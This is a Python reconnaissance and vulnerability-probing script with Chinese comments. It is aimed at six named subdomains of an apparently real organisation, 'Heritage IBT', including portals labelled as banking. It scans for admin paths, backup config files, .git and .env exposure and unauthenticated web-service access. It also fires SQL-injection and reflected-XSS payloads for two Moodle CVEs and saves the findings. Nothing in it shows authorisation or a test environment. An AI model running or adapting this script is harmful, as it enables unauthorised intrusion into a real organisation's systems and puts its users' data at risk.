#!/usr/bin/env python3
"""
Heritage IBT 深度侦察脚本
"""
import sys
import os
import re
import json
import time
import warnings
import urllib3

# 禁用 SSL 警告
urllib3.disable_warnings()
warnings.filterwarnings('ignore')

# 添加 aiburp 路径
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import requests
from aiburp import Burp, discover_hidden_apis, discover_params, compare_headers

# 目标列表
TARGETS = [
    ("https://training.heritageibt.com", "Training (Moodle)"),
    ("https://platform.heritageibt.com", "Platform (Apache)"),
    ("https://secure.heritageibt.com", "Secure (Banking)"),
    ("https://secureib.heritageibt.com", "SecureIB (Banking)"),
    ("https://ecommerce.heritageibt.com", "Ecommerce"),
    ("https://devplatform.heritageibt.com", "DevPlatform"),
]

# Moodle 特定路径
MOODLE_PATHS = [
    "/admin/", "/login/index.php", "/user/", "/course/",
    "/mod/", "/lib/", "/theme/", "/local/", "/blocks/",
    "/webservice/rest/server.php", "/webservice/soap/server.php",
    "/webservice/xmlrpc/server.php", "/webservice/amf/server.php",
    "/admin/tool/", "/admin/settings.php", "/admin/user.php",
    "/admin/roles/", "/admin/environment.php", "/admin/phpinfo.php",
    "/lib/db/install.xml", "/config.php.bak", "/config.php~",
    "/backup/", "/cache/", "/temp/", "/filedir/",
    "/install.php", "/upgrade.php", "/admin/cli/",
    "/report/", "/grade/", "/calendar/", "/message/",
    "/badges/", "/competency/", "/analytics/",
    "/admin/tool/uploaduser/", "/admin/tool/uploadcourse/",
    "/admin/tool/dataprivacy/", "/admin/tool/policy/",
    "/pluginfile.php", "/draftfile.php", "/tokenpluginfile.php",
]

# 敏感文件
SENSITIVE_FILES = [
    "/install.txt", "/README.txt", "/readme.txt", "/INSTALL.txt",
    "/CHANGELOG.txt", "/UPGRADE.txt", "/version.php",
    "/config-dist.php", "/config.php.example",
    "/.git/config", "/.svn/entries", "/.env",
    "/phpinfo.php", "/info.php", "/test.php",
    "/web.config", "/crossdomain.xml", "/clientaccesspolicy.xml",
]


def check_url(url, timeout=10):
    """检查 URL 是否可访问"""
    try:
        r = requests.get(url, timeout=timeout, verify=False, allow_redirects=False)
        return r.status_code, len(r.content), r.headers.get('Server', '')
    except Exception as e:
        return None, 0, str(e)


def scan_moodle_paths(base_url):
    """扫描 Moodle 特定路径"""
    print(f"\n📂 扫描 Moodle 路径: {base_url}")
    found = []
    
    for path in MOODLE_PATHS:
        url = base_url.rstrip('/') + path
        status, size, server = check_url(url)
        
        if status and status not in [404, 403, 500, 502, 503]:
            print(f"  ✅ {path}: {status} ({size}b)")
            found.append({
                'path': path,
                'status': status,
                'size': size,
            })
        time.sleep(0.3)  # 限速
    
    return found


def scan_sensitive_files(base_url):
    """扫描敏感文件"""
    print(f"\n📄 扫描敏感文件: {base_url}")
    found = []
    
    for path in SENSITIVE_FILES:
        url = base_url.rstrip('/') + path
        status, size, server = check_url(url)
        
        if status and status == 200 and size > 0:
            print(f"  🔴 {path}: {status} ({size}b)")
            found.append({
                'path': path,
                'status': status,
                'size': size,
            })
        time.sleep(0.3)
    
    return found


def check_moodle_version(base_url):
    """检测 Moodle 版本"""
    print(f"\n🔍 检测 Moodle 版本...")
    
    # 方法1: 从 /lib/upgrade.txt 获取
    try:
        r = requests.get(f"{base_url}/lib/upgrade.txt", timeout=10, verify=False)
        if r.status_code == 200:
            # 查找版本号
            match = re.search(r'Moodle\s+(\d+\.\d+(?:\.\d+)?)', r.text)
            if match:
                print(f"  版本 (upgrade.txt): {match.group(1)}")
                return match.group(1)
    except:
        pass
    
    # 方法2: 从 HTML 注释获取
    try:
        r = requests.get(base_url, timeout=10, verify=False)
        if r.status_code == 200:
            match = re.search(r'Moodle\s+(\d+\.\d+(?:\.\d+)?)', r.text)
            if match:
                print(f"  版本 (HTML): {match.group(1)}")
                return match.group(1)
    except:
        pass
    
    return None


def check_moodle_webservices(base_url):
    """检测 Moodle Web Services"""
    print(f"\n🌐 检测 Web Services...")
    
    ws_endpoints = [
        "/webservice/rest/server.php",
        "/webservice/soap/server.php",
        "/webservice/xmlrpc/server.php",
    ]
    
    found = []
    for endpoint in ws_endpoints:
        url = base_url.rstrip('/') + endpoint
        status, size, _ = check_url(url)
        
        if status and status != 404:
            print(f"  ✅ {endpoint}: {status}")
            found.append(endpoint)
            
            # 尝试获取函数列表
            try:
                r = requests.get(f"{url}?wsfunction=core_webservice_get_site_info", 
                               timeout=10, verify=False)
                if 'errorcode' not in r.text.lower() and r.status_code == 200:
                    print(f"    🔴 可能存在未授权访问!")
            except:
                pass
    
    return found


def check_moodle_cve(base_url):
    """检测已知 Moodle CVE"""
    print(f"\n🔴 检测已知 CVE...")
    
    vulns = []
    
    # CVE-2021-36393 - SQL Injection (无需认证)
    # 影响 Moodle < 3.9.8, < 3.10.5, < 3.11.1
    print("  检测 CVE-2021-36393 (SQLi)...")
    try:
        # 测试 badge 相关端点
        test_urls = [
            f"{base_url}/badges/mybadges.php?search=test'",
            f"{base_url}/badges/view.php?type=1&id=1'",
        ]
        for url in test_urls:
            r = requests.get(url, timeout=10, verify=False)
            if any(err in r.text.lower() for err in ['sql', 'syntax', 'query', 'odbc']):
                print(f"    🔴 可能存在 SQLi: {url}")
                vulns.append({
                    'cve': 'CVE-2021-36393',
                    'type': 'SQLi',
                    'url': url,
                })
    except Exception as e:
        print(f"    ❌ 测试失败: {e}")
    
    # CVE-2020-25627 - XSS
    print("  检测 CVE-2020-25627 (XSS)...")
    try:
        xss_payload = "<script>alert(1)</script>"
        r = requests.get(f"{base_url}/login/index.php?errorcode={xss_payload}", 
                        timeout=10, verify=False)
        if xss_payload in r.text:
            print(f"    🔴 存在反射型 XSS!")
            vulns.append({
                'cve': 'CVE-2020-25627',
                'type': 'XSS',
                'url': f"{base_url}/login/index.php",
            })
    except:
        pass
    
    return vulns


def check_login_page(base_url):
    """检查登录页面"""
    print(f"\n🔐 检查登录页面...")
    
    login_url = f"{base_url}/login/index.php"
    try:
        r = requests.get(login_url, timeout=10, verify=False)
        
        if r.status_code == 200:
            # 检查是否允许注册
            if 'signup' in r.text.lower() or 'create new account' in r.text.lower():
                print("  ✅ 允许自助注册")
            
            # 检查是否有 SSO
            if 'sso' in r.text.lower() or 'saml' in r.text.lower():
                print("  ℹ️ 可能使用 SSO")
            
            # 提取表单参数
            params = discover_params(login_url)
            if params.inputs:
                print(f"  表单参数: {params.inputs}")
            if params.hidden:
                print(f"  隐藏字段: {[h[0] for h in params.hidden]}")
            
            return True
    except:
        pass
    
    return False


def main():
    print("=" * 60)
    print("🎯 Heritage IBT 深度侦察")
    print("=" * 60)
    
    results = {
        'targets': {},
        'moodle': {},
        'vulns': [],
    }
    
    # 1. 检查所有目标的 HTTP 头
    print("\n📊 HTTP 头对比分析...")
    headers_result = compare_headers(TARGETS)
    
    for name, data in headers_result.targets.items():
        if 'error' not in data:
            print(f"  {name}: {data['status']} - Server: {data['headers'].get('Server', 'N/A')}")
            results['targets'][name] = {
                'status': data['status'],
                'server': data['headers'].get('Server', ''),
                'x_powered_by': data['headers'].get('X-Powered-By', ''),
            }
    
    if headers_result.debug_findings:
        print("\n  🔴 Debug 指标:")
        for name, header, value in headers_result.debug_findings:
            print(f"    [{name}] {header}: {value}")
    
    # 2. 深度扫描 Moodle (training)
    moodle_url = "https://training.heritageibt.com"
    
    # 版本检测
    version = check_moodle_version(moodle_url)
    results['moodle']['version'] = version
    
    # 登录页面
    check_login_page(moodle_url)
    
    # Web Services
    ws = check_moodle_webservices(moodle_url)
    results['moodle']['webservices'] = ws
    
    # 敏感文件
    sensitive = scan_sensitive_files(moodle_url)
    results['moodle']['sensitive_files'] = sensitive
    
    # Moodle 路径
    paths = scan_moodle_paths(moodle_url)
    results['moodle']['accessible_paths'] = paths
    
    # CVE 检测
    vulns = check_moodle_cve(moodle_url)
    results['vulns'].extend(vulns)
    
    # 3. 扫描其他目标的隐藏 API
    for url, name in TARGETS[1:]:  # 跳过 Moodle
        print(f"\n📂 扫描隐藏 API: {name}")
        try:
            apis = discover_hidden_apis(url)
            if apis:
                for path, status, size in apis:
                    print(f"  ✅ {path}: {status} ({size}b)")
                results['targets'][name]['hidden_apis'] = apis
        except Exception as e:
            print(f"  ❌ 失败: {e}")
    
    # 输出结果
    print("\n" + "=" * 60)
    print("📊 侦察完成")
    print("=" * 60)
    
    # 保存 JSON
    output_file = os.path.join(os.path.dirname(__file__), '..', 'heritage_recon_results.json')
    with open(output_file, 'w', encoding='utf-8') as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"\n结果已保存到: {output_file}")
    
    return results


if __name__ == "__main__":
    main()
